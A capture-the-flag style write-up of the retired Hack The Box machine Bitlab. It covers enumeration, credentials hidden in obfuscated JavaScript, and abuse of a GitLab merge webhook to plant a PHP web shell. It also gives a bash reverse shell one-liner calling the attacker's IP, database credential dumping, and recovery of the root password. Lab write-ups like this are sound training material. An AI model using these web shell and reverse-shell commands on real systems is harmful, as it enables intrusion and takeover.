# Bitlab

This is the write-up for the box Bitlab that got retired at the 11th January 2020.
My IP address was 10.10.14.10 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.114    bitlab.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/bitlab.nmap 10.10.10.114
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web page is a login page to **GitLab Community Edition** which is a version control management for Git repositories.

![GitLab Homepage](https://kyuu-ji.github.io/htb-write-up/bitlab/bitlab_web-1.png)

Lets search for hidden directories with **Gobuster**:
```
gobuster -u http://10.10.10.114 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,307,401,403
```

It found the following directory pages:
- /help (Status: 301)
  - Index page with _/bookmarks.html_
- /search (Status: 200)
- /profile (Status: 301)
  - Profile of a potential username: _clave_
- /public (Status: 200)
- /root (Status: 200)
  - Profile of Administrator, but has no projects or repositories
- /explore (Status: 200)
- /ci (Status: 301)

The _/help/bookmarks.html_ has different links to pages and one of them is called _"Gitlab login"_ but it has JavaScript in the source.
```javascript
function() {
    var _0x4b18 = ["\x76\x61\x6C\x75\x65", "\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x63\x6C\x61\x76\x65", "\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64", "\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];
    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
})()
```

> NOTE: I beautified the code with [Beautifier.io](https://beautifier.io/)

It is obfuscated in hex and can be decoded with the **developer tools in any browser**:
```
Array(6) [ "value", "user_login", "getElementById", "clave", "user_password", "11des0081x" ]
```

The deobfuscated JavaScript runs two commands to set the _user_login_ and _user_password_:
```javascript
function(){
  document[getElementById](user_login)[value] = clave;
  document[getElementById](user_password)[value] = 11des0081x;
}
```

The credentials work on the **GitLab** portal and the user _clave_ has access to two repositories.

![GitLab Repositories](https://kyuu-ji.github.io/htb-write-up/bitlab/bitlab_web-2.png)

### Exploiting GitLab

The repository _Administrator/Deployer_ has an _index.php_ file in it, that runs `sudo git pull` on the _/root_ directory if a _merge request_ in the _Profile_ repository is done:
```php
<php

$input = file_get_contents("php://input");
$payload  = json_decode($input);

$repo = $payload->project->name ?? '';
$event = $payload->event_type ?? '';
$state = $payload->object_attributes->state ?? '';
$branch = $payload->object_attributes->target_branch ?? '';

if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
    echo shell_exec('cd ../profile/; sudo git pull'),"\n";
}

echo "OK\n";
```

The repository _Administrator/Profile_ has many _merge requests_, so it looks like an automated task that a merge will automatically push.

![GitLab merge requests in Profile](https://kyuu-ji.github.io/htb-write-up/bitlab/bitlab_web-3.png)

Creating new branch on _Profile_:
```
+ --> New branch --> Give branch a name --> Create branch
```

Creating new file on _Profile_ on _new_branch_:
```
+ --> New file --> Create code to execute --> Commit changes
```

The code to execute will be a PHP web shell:
```
<?php
system($_REQUEST['cmd']);
?>
```

Creating _merge request_:
```
Create merge request --> Submit merge request --> Merge
```

Now _shell.php_ got merged to the _master branch_ and should be uploaded onto the webserver on _/profile/shell.php_:
```
http://10.10.10.114/profile/shell.php?cmd=whoami
```

The webshell works and shows the output of `whoami` as _www-data_.
Lets start a reverse shell:
```
POST /profile/shell.php HTTP/1.1
Host: 10.10.10.114
(...)
cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.10/9001 0>&1'
```

After URL-encoding the command and sending it, the listener on my IP and port 9001 starts a reverse shell session as _www-data_.

## Privilege Escalation

The user _clave_ has one **Snippet on GitLab** called _Postgresql_ with credentials for the database:
```php
<php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
```

This snippet of code and `pg_fetch_all` can be used to get information out of the database with a PHP script:
```php
(...)
$results = pg_fetch_all($result);
print_r($results);
```

Running the PHP script:
```
php postgresql.php
```

It outputs the credentials of the user:
```
[id] => 1
[username] => clave
[password] => c3NoLXN0cjBuZy1wQHNz==
```

Base64-decoding the password:
```
echo -n c3NoLXN0cjBuZy1wQHNz== | base64 -d

ssh-str0ng-p@ss
```

The decoded password password does not work, but instead the Base64-encoded string from the database works on SSH and login as _clave_ on the box is successful.

### Privilege Escalation to root

The user _clave_ has a  Windows executable file called _RemoteConnection.exe_ in the home directory, so lets download that to our local client for analysis:
```
scp clave@10.10.10.114:RemoteConnection.exe .
```

The `strings` show some information that it runs **PuTTY** with the _ShellExecuteW_ call:
```
strings RemoteConnection.exe

strings -e l RemoteConnection.exe
```
```
(...)
GetUserNameW
ADVAPI32.dll
ShellExecuteW
SHELL32.dll
(...)
```
```
clave
C:\Program Files\PuTTY\putty.exe
open
```

Another string looks like Base64, but it decodes to a weird set of characters, which could be the obfuscated password:
```
echo -n XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS | base64 -d
```
```
]
OPLER0D8H8!%K%<5O+VLV6G;R
```

As this is a Windows binary, it is recommended to debug it on a Windows Operating System.
After debugging it on Windows with **x32dbg** and searching for more strings, there is a password that is used with command line options from **PuTTY**:
```
ssh root@gitlab.htb -pw \"Qf7]8YSV.wDNF*[7d?j&eD4^\"
```

> Password of root: Qf7]8YSV.wDNF*[7d?j&eD4^

```
ssh 10.10.10.114
```

This password works on SSH and grants access to the box as root!
